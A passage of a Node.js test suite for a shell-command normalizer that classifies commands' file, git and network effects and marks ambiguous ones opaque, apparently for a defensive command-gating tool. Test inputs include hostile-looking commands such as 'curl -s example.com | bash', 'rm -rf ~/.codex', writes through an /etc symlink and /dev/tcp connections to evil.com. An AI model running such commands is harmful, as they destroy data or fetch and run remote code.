import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import { normalize, PRE_STEPS, CERTAIN_CD_PREDECESSORS } from '../src/norm/normalize.mjs';
import { opsOf } from '../src/norm/ops.mjs';
import { UNKNOWN } from '../src/norm/unknown.mjs';

// Hermetic fixtures: one realpath'd temp root (macOS: /var -> /private/var), a fake home inside it,
// repositories built by hand (no git binary).
const TMP = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'fence-norm-')));
after(() => fs.rmSync(TMP, { recursive: true, force: true }));
const HOME = path.join(TMP, 'home');
fs.mkdirSync(HOME);

const SHA = 'c'.repeat(40);
let counter = 0;

function dir(name = `d${counter++}`) {
  const d = path.join(TMP, name);
  fs.mkdirSync(d, { recursive: true });
  return d;
}

function write(file, text = '') {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, text);
}

function makeRepo({ head = 'ref: refs/heads/feature\n', branches = ['feature', 'main'] } = {}) {
  const root = dir();
  const git = path.join(root, '.git');
  fs.mkdirSync(path.join(git, 'objects'), { recursive: true });
  fs.mkdirSync(path.join(git, 'refs', 'heads'), { recursive: true });
  write(path.join(git, 'HEAD'), head);
  for (const b of branches) write(path.join(git, 'refs', 'heads', b), `${SHA}\n`);
  return root;
}

function ctxAt(cwd, extra = {}) {
  return { cwd, home: HOME, env: {}, ...extra };
}

// normalize text that must not be opaque; returns its commands
function cmds(text, cwd = dir(), extra) {
  const r = normalize(text, ctxAt(cwd, extra));
  assert.ok(Array.isArray(r.commands), `expected commands for ${JSON.stringify(text)}, got ${JSON.stringify(r)}`);
  for (const c of r.commands) {
    for (const k of ['argv', 'classes', 'reads', 'writes', 'ops', 'domains']) assert.ok(Array.isArray(c[k]), k);
    assert.equal(typeof c.env, 'object');
    assert.ok('repo' in c && 'cwd' in c);
  }
  return r.commands;
}

function opaque(text, cwd = dir(), extra) {
  const r = normalize(text, ctxAt(cwd, extra));
  assert.ok(r.opaque, `expected opaque for ${JSON.stringify(text)}, got ${JSON.stringify(r).slice(0, 300)}`);
  assert.equal(typeof r.opaque.reason, 'string');
  assert.equal(typeof r.opaque.construct, 'string');
  assert.equal(typeof r.opaque.offset, 'number');
  return r.opaque;
}

const argvOf = (cs) => cs.map((c) => c.argv);
const byProgram = (cs, prog) => cs.filter((c) => c.argv[0] === prog);

// ---- brief's named tests -------------------------------------------------------------------------

test('cd /x && rm y resolves y under /x', () => {
  const x = dir();
  const start = dir();
  const cs = cmds(`cd ${x} && rm y`, start);
  assert.equal(cs[0].cwd, start);
  assert.equal(cs[1].cwd, x);
  assert.deepEqual(cs[1].ops, [{ path: path.join(x, 'y'), op: 'delete' }]);
  // pushd/popd too
  const y = dir();
  const p = cmds(`pushd ${x} && pushd ${y} && popd && rm z && popd && rm w`, start);
  assert.deepEqual(byProgram(p, 'rm').map((c) => c.cwd), [x, start]);
});

test("git -C dir commit targets dir's repo", () => {
  const here = makeRepo();
  const there = makeRepo({ head: 'ref: refs/heads/main\n' });
  const cs = cmds(`git -C ${there} commit -m x; git commit -m y`, here);
  assert.deepEqual(cs[0].repo, { root: there, branch: 'main' });
  assert.deepEqual(cs[1].repo, { root: here, branch: 'feature' });
  // -C accumulates, relative to the previous one; --git-dir and --work-tree
  const nested = path.join(there, 'sub');
  fs.mkdirSync(nested, { recursive: true });
  assert.deepEqual(cmds(`git -C ${there} -C sub status`, here)[0].repo, { root: there, branch: 'main' });
  assert.deepEqual(cmds(`git --git-dir=${there}/.git --work-tree ${nested} log`, here)[0].repo, {
    root: nested,
    branch: 'main',
  });
  // a non-git command uses the cwd's repository; outside any repo it is null
  assert.deepEqual(cmds('touch f', here)[0].repo, { root: here, branch: 'feature' });
  assert.equal(cmds('touch f', dir())[0].repo, null);
});

test('GIT_DIR= and GIT_WORK_TREE= assignments are honoured', () => {
  const here = makeRepo();
  const there = makeRepo({ head: 'ref: refs/heads/main\n' });
  const wt = dir();
  // prefix assignments
  let cs = cmds(`GIT_DIR=${there}/.git GIT_WORK_TREE=${wt} git commit -m x`, here);
  assert.deepEqual(cs[0].repo, { root: wt, branch: 'main' });
  assert.equal(cs[0].env.GIT_DIR, `${there}/.git`);
  // exported earlier in the command
  cs = cmds(`export GIT_DIR=${there}/.git; git commit -m x`, here);
  assert.deepEqual(cs[1].repo, { root: here, branch: 'main' });
  // assigned but not exported, and not in the host environment: git never sees it
  cs = cmds(`GIT_DIR=${there}/.git; git commit -m x`, here);
  assert.equal(cs.length, 1); // a bare assignment is not a command
  assert.deepEqual(cs[0].repo, { root: here, branch: 'feature' });
  // ... unless the host environment already exports it
  cs = cmds(`GIT_DIR=${there}/.git; git commit -m x`, here, { env: { GIT_DIR: '/elsewhere' } });
  assert.deepEqual(cs[0].repo, { root: here, branch: 'main' });
  // an UNKNOWN value is an UNKNOWN repository
  cs = cmds('GIT_DIR=$(pick) git commit -m x', here);
  assert.equal(cs[1].repo, UNKNOWN);
  // a prefix assignment applies to that command only
  cs = cmds(`GIT_DIR=${there}/.git true; git commit`, here);
  assert.deepEqual(cs[1].repo, { root: here, branch: 'feature' });
});

test('git checkout main && git commit sees main', () => {
  const here = makeRepo();
  let cs = cmds('git checkout main && git commit -m x', here);
  assert.equal(cs[0].repo.branch, 'feature');
  assert.equal(cs[1].repo.branch, 'main');
  // the switch also reaches non-git commands (file writes inside the repo)
  assert.equal(cmds('git switch main && touch f', here)[1].repo.branch, 'main');
  // -b / -c name the new branch whether or not it exists
  assert.equal(cmds('git checkout -b topic origin/x && git commit', here)[1].repo.branch, 'topic');
  assert.equal(cmds('git switch -c topic && git commit', here)[1].repo.branch, 'topic');
  // detaching gives null
  assert.equal(cmds('git switch --detach HEAD~1 && git commit', here)[1].repo.branch, null);
  // a target that is not a local branch (tag, commit, remote, path, `-`) is UNKNOWN
  for (const t of ['v1.0', 'nope', '-', '@{-1}']) {
    assert.equal(cmds(`git checkout ${t} && git commit`, here)[1].repo.branch, UNKNOWN, t);
  }
  // checking out files keeps the branch
  assert.equal(cmds('git checkout -- a.txt && git commit', here)[1].repo.branch, 'feature');
  assert.equal(cmds('git checkout main a.txt && git commit', here)[1].repo.branch, 'feature');
  // a checkout that may have failed (`;`), or one in a branch, leaves the branch UNKNOWN
  assert.equal(cmds('git checkout main; git commit', here)[1].repo.branch, UNKNOWN);
  assert.equal(cmds('if true; then git checkout main; fi; git commit', here).at(-1).repo.branch, UNKNOWN);
  // checkout || fallback: the fallback runs on the old branch
  cs = cmds('git checkout main || git commit', here);
  assert.equal(cs[1].repo.branch, 'feature');
  // a subshell's checkout changes the repository for everyone
  assert.equal(cmds('(git checkout main) && git commit', here).at(-1).repo.branch, 'main');
  assert.equal(cmds('(git checkout main); git commit', here).at(-1).repo.branch, UNKNOWN);
  assert.equal(cmds('echo $(git checkout main); git commit', here).at(-1).repo.branch, UNKNOWN);
  assert.equal(cmds('(git checkout main && git commit)', here).at(-1).repo.branch, 'main');
  // a branch rename, rebase or symbolic-ref leaves the branch UNKNOWN for later commands
  for (const c of ['git branch -m feature main', 'git rebase main other', 'git symbolic-ref HEAD refs/heads/main']) {
    assert.equal(cmds(`${c} && git commit`, here)[1].repo.branch, UNKNOWN, c);
  }
});

test('X=rm; $X -rf a yields an rm command', () => {
  const d = dir();
  const cs = cmds('X=rm; $X -rf a', d);
  assert.deepEqual(argvOf(cs), [['rm', '-rf', 'a']]);
  assert.deepEqual(cs[0].ops, [{ path: path.join(d, 'a'), op: 'delete' }]);
  assert.deepEqual(argvOf(cmds('export X=rm; ${X:-ls} a')), [['export', 'X=rm'], ['rm', 'a']]);
  // prefix assignments go to the command's env and do not persist
  const p = cmds('X=1 env; echo $X');
  assert.deepEqual(p[0].env, { X: '1' });
  assert.deepEqual(p[1].argv, ['echo', UNKNOWN]);
});

test('$(pick) as the command word is opaque', () => {
  const o = opaque('$(pick) -rf a');
  assert.equal(o.construct, 'command-word');
  assert.equal(o.offset, 0);
  assert.equal(opaque('echo hi; `pick` a').offset, 9);
  // other words that are UNKNOWN, split or glob in command position
  opaque('$HOSTVAR a');
  opaque("X='rm -rf'; $X a");
  opaque('X=; $X rm a');
  opaque('*.sh');
  opaque('if true; then $(pick); fi');
});

test('mv a b && cat b leaves b UNKNOWN', () => {
  const d = dir();
  const cs = cmds('mv a b && cat b c b/x ./b/../b', d);
  assert.deepEqual(cs[0].ops, [
    { path: path.join(d, 'a'), op: 'move' },
    { path: path.join(d, 'b'), op: 'move' },
  ]);
  assert.deepEqual(cs[1].argv, ['cat', UNKNOWN, 'c', UNKNOWN, UNKNOWN]);
  // ln too, and it reaches redirect targets, cd targets and later commands anywhere
  const l = cmds('ln -s /etc l; echo x > l/passwd; cd l && rm y; (cat l)', d);
  assert.deepEqual(l[1].writes, [UNKNOWN]);
  assert.equal(byProgram(l, 'rm')[0].cwd, UNKNOWN);
  assert.deepEqual(byProgram(l, 'cat')[0].argv, ['cat', UNKNOWN]);
  // an UNKNOWN mv operand makes every later path UNKNOWN
  const u = cmds('mv $(pick) b; cat c -n', d);
  assert.deepEqual(u[2].argv, ['cat', UNKNOWN, '-n']);
  // a command word naming a moved path is opaque
  opaque('mv evil ./tool && ./tool', d);
});

test('rm -rf ~/.codex records a delete op on the ancestor path', () => {
  const cs = cmds('rm -rf ~/.codex');
  assert.deepEqual(cs[0].argv, ['rm', '-rf', `${HOME}/.codex`]);
  assert.deepEqual(cs[0].ops, [{ path: path.join(HOME, '.codex'), op: 'delete' }]);
  // a quoted ~ is a literal directory named ~, not home
  const d = dir();
  assert.deepEqual(cmds("rm -rf '~/.codex'", d)[0].ops, [{ path: path.join(d, '~', '.codex'), op: 'delete' }]);
});

test('redirect > file is a write, > /dev/null is not', () => {
  const d = dir();
  let cs = cmds('echo hi > out.txt 2>/dev/null', d);
  assert.deepEqual(cs[0].writes, [path.join(d, 'out.txt')]);
  assert.deepEqual(cs[0].reads, []);
  cs = cmds('cmd >> a 2>&1 &> b &>> c >| e >&f <> g < h <&i 3>&- 2>&1 <<< "x" > /dev/stderr < /dev/stdin > /dev/fd/3 > /dev/tty', d);
  assert.deepEqual(
    cs[0].writes,
    ['a', 'b', 'c', 'e', 'f', 'g'].map((f) => path.join(d, f)),
  );
  assert.deepEqual(cs[0].reads, ['g', 'h', 'i'].map((f) => path.join(d, f)));
  // /dev/tcp and /dev/udp give a domain and network-fetch
  cs = cmds('cat < /dev/tcp/Example.COM/80; echo > /dev/udp/10.0.0.1/53');
  assert.deepEqual(cs[0].domains, ['example.com']);
  assert.deepEqual(cs[0].classes, ['network-fetch']);
  assert.deepEqual(cs[0].reads, []);
  assert.deepEqual(cs[1].domains, ['10.0.0.1']);
  // an UNKNOWN target is an UNKNOWN write
  assert.deepEqual(cmds('echo > $(pick)')[1].writes, [UNKNOWN]);
  // zsh redirect-only commands keep their effects
  cs = cmds('> made.txt', d);
  assert.deepEqual(cs[0].argv, []);
  assert.deepEqual(cs[0].writes, [path.join(d, 'made.txt')]);
  // redirections on compound commands
  cs = cmds('{ echo a; echo b; } > both.txt', d);
  assert.ok(cs.some((c) => c.writes.includes(path.join(d, 'both.txt'))));
  cs = cmds('while read l; do echo $l; done < in.txt', d);
  assert.ok(cs.some((c) => c.reads.includes(path.join(d, 'in.txt'))));
});

test('$(cmd) argument adds cmd as a command', () => {
  const cs = cmds('echo $(rm -rf x) "`touch y`"');
  assert.deepEqual(argvOf(cs).sort(), [['echo', UNKNOWN, UNKNOWN], ['rm', '-rf', 'x'], ['touch', 'y']].sort());
  // in assignments, redirect targets, ${…} arguments, case words, for lists, nested
  const n = cmds('X=$(a); echo ${Y:-$(b)} > $(c); case $(d) in $(e)) f;; esac; for i in $(g); do :; done; echo $(h $(i))');
  for (const p of ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i']) assert.ok(byProgram(n, p).length >= 1, p);
  // the substitution runs in a subshell: its cd and assignments stay inside
  const d = dir();
  const s = cmds(`echo $(cd /; X=rm); rm a; $X`.replace('; $X', ''), d);
  assert.equal(byProgram(s, 'rm')[0].cwd, d);
  opaque('echo $(X=rm); $X a');
});

test('every EffectiveCommand carries ops for delete, move, chmod -R and ln', () => {
  const d = dir();
  const p = (f) => path.join(d, f);
  const cs = cmds(
    'rm -f a; rmdir b; unlink c; shred -u -n 3 d; mv e f; mv -t g h; chmod -R 700 i; chmod 700 nope; chown -R u:g j; chgrp -R g k; ln -s l m; cat n',
    d,
  );
  assert.deepEqual(
    cs.map((c) => c.ops),
    [
      [{ path: p('a'), op: 'delete' }],
      [{ path: p('b'), op: 'delete' }],
      [{ path: p('c'), op: 'delete' }],
      [{ path: p('d'), op: 'delete' }],
      [
        { path: p('e'), op: 'move' },
        { path: p('f'), op: 'move' },
      ],
      [
        { path: p('g'), op: 'move' },
        { path: p('h'), op: 'move' },
      ],
      [{ path: p('i'), op: 'chmod' }],
      [],
      [{ path: p('j'), op: 'chmod' }],
      [{ path: p('k'), op: 'chmod' }],
      [
        { path: p('l'), op: 'link' },
        { path: p('m'), op: 'link' },
      ],
      [],
    ],
  );
});

// ---- opsOf directly ------------------------------------------------------------------------------

test('opsOf: options, --, modes and words that are both option and operand', () => {
  assert.deepEqual(opsOf(['rm', '-rf', '--', '-x']), [{ path: '-x', op: 'delete' }]);
  assert.deepEqual(opsOf(['/bin/rm', 'a', '-r']), [
    { path: 'a', op: 'delete' },
    { path: '-r', op: 'delete' },
  ]);
  // a dash word that cannot be an option (BSD rm reads it as a file)
  assert.deepEqual(opsOf(['rm', '-/../x']), [{ path: '-/../x', op: 'delete' }]);
  assert.deepEqual(opsOf(['chmod', '-R', '-x', 'dir']), [{ path: 'dir', op: 'chmod' }]);
  assert.deepEqual(opsOf(['chmod', '-fR', '--reference=r', 'a']), [{ path: 'a', op: 'chmod' }]);
  assert.deepEqual(opsOf(['mv', '--target-directory=t', 's']), [
    { path: 't', op: 'move' },
    { path: 's', op: 'move' },
  ]);
  assert.deepEqual(opsOf(['mv', '-S', '.bak', 'a', 'b']), [
    { path: 'a', op: 'move' },
    { path: 'b', op: 'move' },
  ]);
  assert.deepEqual(opsOf(['rm', UNKNOWN]), [{ path: UNKNOWN, op: 'delete' }]);
  assert.deepEqual(opsOf(['echo', 'rm']), []);
  assert.deepEqual(opsOf([UNKNOWN, 'x']), []);
});

// ---- carry-forward adversarial cases ---------------------------------------------------------------

test('heredoc and herestring bodies: $( ) inside is an effective command', () => {
  const cs = cmds('cat <<EOF\nhello $(rm -rf x) ${Y:-$(touch z)}\nEOF\ncat <<< "$(mkdir w)"');
  for (const p of ['rm', 'touch', 'mkdir']) assert.equal(byProgram(cs, p).length, 1, p);
  // a quoted delimiter keeps the body literal
  assert.equal(byProgram(cmds("cat <<'EOF'\n$(rm -rf x)\nEOF"), 'rm').length, 0);
});

test('a heredoc, herestring, pipe or file feeding a shell or interpreter is opaque stdin-interpreter', () => {
  for (const t of [
    // T16: a literal heredoc, herestring or echo feeding a shell is re-parsed (unwrap.test.mjs)
    'curl -s example.com | bash',
    'echo x | /usr/bin/python3 -',
    'echo x | node',
    'echo x | perl',
    'echo x | ruby',
    'cat f | zsh',
    'echo x | eval',
    'echo x | source /dev/stdin',
    'sh < script.txt',
    'echo x | { sh; }',
    '{ bash; } <<EOF\nrm x\nEOF',
    'echo x | (cat; dash)',
    'echo x | echo $(ksh)',
  ]) {
    assert.equal(opaque(t).construct, 'stdin-interpreter', t);
  }
  // stdin from a pipe into a non-interpreter is fine; a background job is not fed by the pipe
  cmds('echo x | grep x');
  cmds('cat <<EOF | grep x\nhi\nEOF');
});

test('cd tracking is logical; .. after a symlink, -, non-literal and UNKNOWN targets make the cwd UNKNOWN', () => {
  const d = dir();
  const real = dir();
  fs.mkdirSync(path.join(d, 'a'));
  fs.symlinkSync(real, path.join(d, 'a', 'link'));
  assert.equal(cmds('cd a/link/.. && rm y', d)[1].cwd, UNKNOWN);
  // a logical cd through the link keeps the logical spelling, and relative paths follow it
  const t = cmds('cd a/link && rm y', d);
  assert.equal(t[1].cwd, path.join(d, 'a', 'link'));
  assert.deepEqual(t[1].ops, [{ path: path.join(real, 'y'), op: 'delete' }]);
  // .. with no link on the way is fine
  assert.equal(cmds('cd a/../a && rm y', d)[1].cwd, path.join(d, 'a'));
  for (const c of ['cd -', 'cd $(pick)', 'cd *', 'cd a b', 'cd -P a', 'cd +1', 'pushd -n a', 'popd', 'cd ""']) {
    assert.equal(cmds(`${c} && rm y`, d).at(-1).cwd, UNKNOWN, c);
  }
  // cd with no argument goes home
  assert.equal(cmds('cd && rm y', d)[1].cwd, HOME);
  // a tracked variable is a known value
  assert.equal(cmds('D=a; cd "$D" && rm y', d).at(-1).cwd, path.join(d, 'a'));
  // CDPATH (host or in-command) makes a bare relative target ambiguous; ./ is not
  assert.equal(cmds('cd a && rm y', d, { env: { CDPATH: '/x' } })[1].cwd, UNKNOWN);
  assert.equal(cmds('cd ./a && rm y', d, { env: { CDPATH: '/x' } })[1].cwd, path.join(d, 'a'));
  assert.equal(cmds('CDPATH=/x; cd a && rm y', d).at(-1).cwd, UNKNOWN);
  // $PWD follows the tracked cwd
  assert.deepEqual(cmds('cd a && echo $PWD', d)[1].argv, ['echo', path.join(d, 'a')]);
});

test('a cd that may fail: ; and || see the old or an UNKNOWN cwd, && and `|| exit` see the new one', () => {
  const d = dir();
  fs.mkdirSync(path.join(d, 'ok'));
  const ok = path.join(d, 'ok');
  // an existing directory: the cd succeeds
  assert.equal(cmds('cd ok; rm y', d)[1].cwd, ok);
  // a missing one may be created earlier or may fail: UNKNOWN unless && guarantees it
  assert.equal(cmds('cd missing; rm y', d)[1].cwd, UNKNOWN);
  assert.equal(cmds('mkdir -p missing && cd missing && rm y', d)[2].cwd, path.join(d, 'missing'));
  assert.equal(cmds('cd missing && rm y; rm z', d)[2].cwd, UNKNOWN);
  assert.equal(cmds('{ cd missing; }; rm y', d)[1].cwd, UNKNOWN);
  // the right side of || runs only when the cd failed: in the old cwd
  assert.equal(cmds('cd missing || rm -rf y', d)[1].cwd, d);
  assert.equal(cmds('cd ok || rm -rf y', d)[1].cwd, d);
  // `|| exit` ends the other path
  assert.equal(cmds('cd missing || exit 1; rm y', d).at(-1).cwd, path.join(d, 'missing'));
  assert.equal(cmds('cd missing || { echo no; exit 1; }; rm y', d).at(-1).cwd, path.join(d, 'missing'));
  // after an earlier delete or move, even an existing directory may be gone
  assert.equal(cmds('rm -rf ok; cd ok; rm y', d)[2].cwd, UNKNOWN);
  // negation inverts success: nothing is assumed
  assert.equal(cmds('! cd ok && rm y', d)[1].cwd, UNKNOWN);
});

test('zsh runs the last pipeline member in the current shell: its assignments and cd become UNKNOWN', () => {
  const d = dir();
  opaque('X=ls; echo | X=rm; $X a', d);
  assert.equal(cmds('echo | cd /; rm y', d).at(-1).cwd, UNKNOWN);
  // earlier members run in subshells
  assert.deepEqual(cmds('X=ls; X=rm | cat; $X a', d).at(-1).argv, ['ls', 'a']);
  assert.equal(cmds('cd / | cat; rm y', d).at(-1).cwd, d);
});

test('variables assigned in branches or loops are UNKNOWN afterwards', () => {
  opaque('X=ls; if true; then X=rm; fi; $X a');
  opaque('X=ls; if false; then :; else X=rm; fi; $X a');
  opaque('X=ls; case y in y) X=rm;; esac; $X a');
  opaque('X=ls; true && X=rm; $X a');
  opaque('X=ls; false || X=rm; $X a');
  opaque('X=ls; while false; do X=rm; done; $X a');
  // inside a loop, an earlier iteration may have assigned it
  opaque('X=echo; for i in 1 2; do $X a; X=rm; done');
  opaque('X=echo; while true; do $X a; X=rm; done');
  // the else branch sees the condition's effects, not the then-branch's
  assert.deepEqual(cmds('X=ls; if false; then X=rm; else $X a; fi').at(-1).argv, ['ls', 'a']);
  assert.deepEqual(cmds('X=ls; if X=rm; false; then :; else $X a; fi').at(-1).argv, ['rm', 'a']);
  // case fallthrough sees the previous arm's assignments as UNKNOWN
  opaque('X=ls; case y in y) X=rm;& z) $X a;; esac');
  // untouched names stay known
  assert.deepEqual(cmds('X=ls; if true; then Y=1; fi; $X a').at(-1).argv, ['ls', 'a']);
  // a body sees the condition's success
  assert.deepEqual(cmds('if X=rm; then $X a; fi').at(-1).argv, ['rm', 'a']);
});

test('for loops unroll literal lists; the loop variable keeps its last value', () => {
  const d = dir();
  const cs = cmds('for f in a b; do rm $f; done; echo $f', d);
  assert.deepEqual(argvOf(cs), [['rm', 'a'], ['rm', 'b'], ['echo', 'b']]);
  // globs expand from the cwd
  write(path.join(d, 'g1.txt'));
  write(path.join(d, 'g2.txt'));
  assert.deepEqual(argvOf(cmds('for f in *.txt; do rm $f; done', d)), [['rm', 'g1.txt'], ['rm', 'g2.txt']]);
  assert.deepEqual(cmds('rm *.txt', d)[0].argv, ['rm', 'g1.txt', 'g2.txt']);
  // an UNKNOWN list: body once with the variable UNKNOWN, and UNKNOWN afterwards
  assert.deepEqual(argvOf(cmds('for f in $(ls); do rm $f; done; echo $f', d)).slice(1), [['rm', UNKNOWN], ['echo', UNKNOWN]]);
  // break, or an assignment to the variable in the body: UNKNOWN afterwards
  assert.deepEqual(cmds('for f in a b; do break; done; echo $f', d).at(-1).argv, ['echo', UNKNOWN]);
  // cd in a loop body: UNKNOWN cwd in the body and after
  const c = cmds('for x in a b; do cd $x; rm y; done; rm z', d);
  assert.ok(byProgram(c, 'rm').every((r) => r.cwd === UNKNOWN));
});

test('subshells and groups: a subshell keeps its changes inside, a group does not', () => {
  const d = dir();
  fs.mkdirSync(path.join(d, 'ok'));
  assert.deepEqual(cmds('(X=rm; cd ok); X=ls; $X a', d).at(-1).argv, ['ls', 'a']);
  assert.equal(cmds('(cd ok); rm y', d).at(-1).cwd, d);
  assert.equal(cmds('{ cd ok; }; rm y', d).at(-1).cwd, path.join(d, 'ok'));
  assert.equal(cmds('cd ok & rm y', d).at(-1).cwd, d);
});

test('parser opacity passes through: {x}>f rm, function definitions, unterminated input', () => {
  assert.equal(opaque('{x}>f rm a').construct, 'named-fd');
  assert.equal(opaque('f() { rm a; }').construct, 'function');
  assert.equal(opaque('echo "abc').reason, 'unterminated');
  assert.equal(opaque('x'.repeat(33 * 1024)).reason, 'size');
});

test('never throws: bad context and internal errors are opaque internal', () => {
  const boom = {
    get cwd() {
      throw new Error('boom');
    },
  };
  assert.equal(normalize('ls', boom).opaque.reason, 'internal');
  assert.ok(normalize(42, {}).opaque);
  assert.ok(normalize('ls', null).commands);
  // a missing or relative cwd: relative paths are UNKNOWN, absolute ones still resolve
  const cs = normalize('rm a /b', { cwd: 'rel', home: HOME }).commands;
  assert.equal(cs[0].cwd, UNKNOWN);
  assert.deepEqual(cs[0].ops, [
    { path: UNKNOWN, op: 'delete' },
    { path: '/b', op: 'delete' },
  ]);
});

test('lists, and-or, async and newlines all produce commands in order', () => {
  const cs = cmds('a; b && c || d & e\nf | g');
  assert.deepEqual(cs.map((c) => c.argv[0]), ['a', 'b', 'c', 'd', 'e', 'f', 'g']);
});

// ---- fix round 1 ---------------------------------------------------------------------------------

test('redirect exclusions apply to the resolved path only: /dev/fd/.., /dev/./null', () => {
  const d = dir();
  const out = path.join(d, 'out');
  // /dev/fd is resolved physically: a real directory on macOS, a symlink to /proc/self/fd on Linux, where
  // `/dev/fd/../..` therefore lands under /proc. The expected path follows the same resolution (equal to `out` on macOS).
  const expectedOut = path.join(path.resolve(fs.realpathSync('/dev/fd'), '..', '..'), out);
  const cs = cmds(
    [
      `echo x > /dev/fd/../..${out}`,
      `cat < /dev/fd/../..${out}`,
      'echo > /dev/./null',
      'cat < /dev/./null',
      'echo > /dev/fd/../x',
      'echo > /dev/fd/3',
      'echo > /dev/fd/1x',
      'cat <> /dev//stdin',
      'cat < /dev/./tcp/Evil.com/80',
      'echo > /dev/fd/../tcp/h.com/1',
    ].join('; '),
    d,
  );
  assert.deepEqual(cs[0].writes, [expectedOut]);
  assert.deepEqual(cs[1].reads, [expectedOut]);
  assert.deepEqual([cs[2].writes, cs[3].reads], [[], []]);
  assert.equal(cs[4].writes.length, 1);
  assert.notEqual(cs[4].writes[0], '/dev/fd');
  assert.deepEqual(cs[5].writes, []);
  assert.equal(cs[6].writes.length, 1);
  // no `..`: the normalized /dev/stdin is the device itself
  assert.equal(cs[7].writes.length + cs[7].reads.length, 0);
  assert.deepEqual(cs[8].domains, ['evil.com']);
  assert.deepEqual(cs[8].classes, ['network-fetch']);
  assert.deepEqual(cs[9].domains, ['h.com']);
});

test('a cd is certain only after commands known not to remove or lock directories', () => {
  const d = dir();
  fs.mkdirSync(path.join(d, 'sub'));
  const sub = path.join(d, 'sub');
  for (const pre of ['make clean', 'find . -delete', 'chmod 000 sub', 'echo $(make clean)', './script.sh']) {
    assert.equal(cmds(`${pre}; cd sub; rm -rf x`, d).at(-1).cwd, UNKNOWN, pre);
    // && successors only run when the cd succeeded
    assert.equal(cmds(`${pre}; cd sub && rm -rf x`, d).at(-1).cwd, sub, pre);
  }
  assert.equal(cmds('echo hi; ls -la; cat f; git status; git log -1; pwd; cd sub; rm y', d).at(-1).cwd, sub);
  assert.equal(cmds('git branch; cd sub; rm y', d).at(-1).cwd, sub);
  assert.equal(cmds('git branch -D old; cd sub; rm y', d).at(-1).cwd, UNKNOWN);
  assert.ok(Array.isArray(CERTAIN_CD_PREDECESSORS) && CERTAIN_CD_PREDECESSORS.length > 0);
});

test('assignments in heredoc bodies and herestrings are applied', () => {
  const d = dir();
  for (const t of [
    'unset Y; cat <<EOF\n${Y:=/etc}\nEOF\nrm -rf "${Y:-safe}"',
    'unset Y; cat <<< "${Y:=/etc}"; rm -rf "${Y:-safe}"',
    'unset Y; { cat; } <<EOF\n${Y:=/etc}\nEOF\nrm -rf "${Y:-safe}"',
  ]) {
    const rm = byProgram(cmds(t, d), 'rm')[0];
    assert.ok(rm.argv[2] === '/etc' || rm.argv[2] === UNKNOWN, `${JSON.stringify(t)} -> ${String(rm.argv[2])}`);
    assert.notDeepEqual(rm.ops, [{ path: path.join(d, 'safe'), op: 'delete' }]);
  }
});

test('mv/ln taint reaches paths that pass through an operand, with .. after it', () => {
  const d = dir();
  let cs = cmds('ln -s /etc d; rm -f d/../hosts; echo > d/../x; cat ./d/./../y', d);
  assert.deepEqual(cs[1].argv, ['rm', '-f', UNKNOWN]);
  assert.deepEqual(cs[1].ops, [{ path: UNKNOWN, op: 'delete' }]);
  assert.deepEqual(cs[2].writes, [UNKNOWN]);
  assert.deepEqual(cs[3].argv, ['cat', UNKNOWN]);
  cs = cmds('mv a b; cat b/../c dd', d);
  assert.deepEqual(cs[1].argv, ['cat', UNKNOWN, 'dd']);
});

test('git subcommands outside the known list, and -c alias, make the branch UNKNOWN', () => {
  const here = makeRepo();
  for (const c of ['git co main', 'git -c alias.x=checkout x main', 'git frobnicate', 'git $(pick) main']) {
    assert.equal(cmds(`${c} && git commit`, here).at(-1).repo.branch, UNKNOWN, c);
  }
  for (const c of ['git status', 'git add .', 'git commit -m x', 'git log', 'git diff', 'git stash', 'git fetch']) {
    assert.equal(cmds(`${c} && git commit`, here).at(-1).repo.branch, 'feature', c);
  }
});

test('a repository created in the command is UNKNOWN for later commands', () => {
  const outside = dir();
  for (const t of [
    'git init -b main n && cd n && git commit',
    'git clone u x && cd x && git push',
    'git worktree add ../w dev && cd ../w && git commit',
    'mkdir -p r/.git && cd r && git commit',
    'mkdir r && echo "gitdir: /x" > r/.git && cd r && git commit',
  ]) {
    assert.equal(cmds(t, outside).at(-1).repo, UNKNOWN, t);
  }
  // inside an existing repository, the new nested one shadows it
  const here = makeRepo();
  assert.equal(cmds('git init n && cd n && git commit', here).at(-1).repo, UNKNOWN);
  assert.equal(cmds('git clone https://h/p/proj.git && cd proj && touch f', here).at(-1).repo, UNKNOWN);
  // elsewhere in the existing repository nothing changes
  assert.deepEqual(cmds('git init n; git commit', here).at(-1).repo, { root: here, branch: 'feature' });
});

test('builtin/command cd is tracked; eval, source and . make cwd and branch UNKNOWN', () => {
  const d = makeRepo();
  fs.mkdirSync(path.join(d, 'sub'));
  const sub = path.join(d, 'sub');
  assert.equal(cmds('builtin cd sub; rm -rf f', d).at(-1).cwd, sub);
  assert.equal(cmds('command cd sub && rm f', d).at(-1).cwd, sub);
  for (const c of ['eval true', 'source s.sh', '. ./s.sh']) {
    const cs = cmds(`${c}; rm f; git commit`, d);
    assert.equal(cs.at(-2).cwd, UNKNOWN, c);
    assert.equal(cs.at(-1).repo, UNKNOWN, c);
  }
});

test('exec with only a stdin redirection feeds every later shell in the same scope', () => {
  assert.equal(opaque('exec < f; sh').construct, 'stdin-interpreter');
  assert.equal(opaque('exec 0<<EOF\nrm x\nEOF\nbash').construct, 'stdin-interpreter');
  assert.equal(opaque('{ exec < f; }; python3').construct, 'stdin-interpreter');
  cmds('exec 3< f; sh -c true');
  cmds('(exec < f); sh -c true');
});

test('pushd +N and cd with a non-empty stack (zsh AUTO_PUSHD) make the stack UNKNOWN', () => {
  const d = dir();
  for (const n of ['a', 'b']) fs.mkdirSync(path.join(d, n));
  assert.equal(cmds('pushd a && pushd +1 && popd && rm y', d).at(-1).cwd, UNKNOWN);
  assert.equal(cmds('pushd a && cd ../b && popd && rm y', d).at(-1).cwd, UNKNOWN);
  // without a cd in between the stack is known
  assert.equal(cmds('pushd a && popd && rm y', d).at(-1).cwd, d);
});

test('PRE_STEPS unwrap a command before cd, git, ops and taint are computed', () => {
  const here = makeRepo();
  const there = makeRepo({ head: 'ref: refs/heads/main\n' });
  const nice = ({ argv }) => (argv[0] === 'nice' ? { argv: argv.slice(1) } : null);
  const envStep = ({ argv }) => {
    if (argv[0] !== 'env') return null;
    const env = {};
    let i = 1;
    for (; i < argv.length && typeof argv[i] === 'string' && argv[i].includes('='); i++) {
